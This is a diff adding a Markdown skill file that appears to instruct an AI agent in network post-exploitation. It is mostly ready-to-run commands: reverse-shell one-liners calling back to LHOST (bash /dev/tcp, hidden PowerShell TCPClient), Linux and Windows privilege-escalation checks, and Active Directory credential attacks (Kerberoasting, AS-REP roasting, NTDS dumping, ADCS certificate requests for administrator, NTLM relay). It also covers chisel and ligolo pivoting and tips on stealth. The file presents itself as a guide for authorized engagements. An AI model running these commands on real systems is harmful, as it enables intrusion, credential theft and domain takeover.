+---
+description: "Host and network exploitation: service-specific attack paths, credential access, Linux and Windows privilege escalation, Active Directory abuse, pivoting, and the loot discipline that makes post-exploitation reproducible."
+whenToUse: "After recon found reachable services, or when the task is post-exploitation, privilege escalation, or lateral movement."
+---
+
+# Network and post-exploitation playbook
+
+## 1. Turn services into access
+
+For each open port: identify the product and version from the banner, then test in this order.
+
+1. **Default and null credentials** — vendor defaults, `admin:admin`, anonymous FTP, SMB null sessions, Redis/Mongo without auth, Jenkins script console.
+2. **Known CVEs for the exact version** — search the product and version, prefer PoCs you can read; reproduce the version check before firing.
+3. **Configuration exposure** — exposed `.git`, backups, Tomcat manager, Jupyter without token, Docker API on 2375, Kubernetes API anonymous, Elasticsearch open.
+4. **Credential-bearing services** — SNMP community strings, LDAP anonymous bind, SMB guest, WinRM with valid users.
+
+Keep a short log per attempt: service, payload, result, timestamp. Three failed attempts on the same path means change the path, not the payload.
+
+## 2. Shells and sessions
+
+```bash
+# listener
+nc -lvnp 4444
+# bash
+bash -i >& /dev/tcp/LHOST/4444 0>&1
+# powershell
+powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('LHOST',4444);..."
+# upgrade a dumb shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'   # then Ctrl-Z, stty raw -echo, fg
+```
+
+Prefer a stable channel (SSH with keys you create, `ligolo-ng`, `chisel`) over a one-shot reverse shell when the engagement will last. Record the session type in the case file.
+
+## 3. Linux privilege escalation
+
+```bash
+id; sudo -l; uname -a; cat /etc/os-release
+find / -perm -4000 -type f 2>/dev/null          # SUID
+getcap -r / 2>/dev/null                         # capabilities
+crontab -l; ls -la /etc/cron*; systemctl list-timers
+cat /etc/passwd; ls -la /home/*/.ssh; env
+```
+
+High-yield paths: `sudo` entries that run editors, pagers, or scripts you can edit; SUID binaries with GTFOBins escapes; writable service units or PATH directories; Docker group membership; NFS `no_root_squash`; kernel CVEs (verify the kernel build, not just the version string); credentials in history files, config files, and environment.
+
+## 4. Windows privilege escalation
+
+```powershell
+whoami /all
+systeminfo
+Get-Service | Where-Object {$_.StartType -eq 'Auto'}
+Get-ModifiableService
+```
+
+High-yield paths: unquoted service paths in writable directories, weak service ACLs (`sc qc`, `icacls`), AlwaysInstallElevated, stored credentials (`cmdkey /list`, `vaultcmd`), autologon registry entries, scheduled tasks with writable scripts, SeImpersonate/SeAssignPrimaryToken (Potato family), SeBackup/SeRestore (registry hive and file copy), backup operators, UAC bypass for the current build, and unpatched local privilege CVEs.
+
+## 5. Active Directory
+
+```bash
+# unauthenticated and authenticated enumeration
+nxc smb DC --users --shares --pass-pol
+nxc ldap DC -u USER -p PASS --query "(objectClass=*)"
+bloodhound-python -u USER -p PASS -d DOMAIN -ns DC -c All
+
+# credential attacks
+nxc smb DC -u users.txt -p passwords.txt --continue-on-success
+impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC -request     # Kerberoast
+impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC   # AS-REP roast
+nxc smb TARGET -u USER -p PASS --ntds                         # DCSync rights only
+
+# ADCS
+certipy find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable
+certipy req -u USER@DOMAIN -p PASS -ca CA -template TEMPLATE -upn administrator@DOMAIN
+
+# relay and coercion
+responder -I INTERFACE -wv
+impacket-ntlmrelayx -tf targets.txt -smb2support
+coercer coerce -l TARGET -u USER -p PASS -t DC
+```
+
+Chain decisions: Kerberoast → crack → service account rights; ACL abuse (GenericAll/WriteDACL/ForceChangePassword) → targeted takeover; ADCS ESC1/ESC8 → certificate for domain admin; unconstrained delegation → coerce a DC; shadow credentials when write access to an object exists.
+
+## 6. Pivoting
+
+```bash
+# SOCKS through SSH
+ssh -D 1080 -N user@pivot
+# ligolo-ng
+./proxy -selfcert
+./agent -connect LHOST:11601 -ignore-cert
+# chisel
+./chisel server -p 8080 --reverse
+./chisel client LHOST:8080 R:socks
+```
+
+Add routes, then rescan the newly reachable segment. Record which host provides each route so the report can explain reachability.
+
+## 7. Loot discipline
+
+- Keep only what the objective needs: proof of access, configuration that explains a finding, and credentials you must use to proceed.
+- Hash every artifact you store; the case file references the hash, not a vague description.
+- Never delete logs or tamper with production data unless the user explicitly asked for a detection test — and record that instruction in the case file.
+- Every extracted credential goes into the case notes with its source host and the date, never into the chat transcript as plain text if the user asked for redaction.
+
+## Pitfalls
+
+- A successful exploit on a lab-like banner may be a honeypot; cross-check hostname, MAC vendor, and response timing.
+- `sudo -l` output can be stale after a policy reload — re-run before relying on it.
+- Kerberos clock skew breaks authentication; sync before blaming credentials.
+- Deleted tools leave traces; prefer living-off-the-land binaries when the objective is stealth, and say which choice you made.
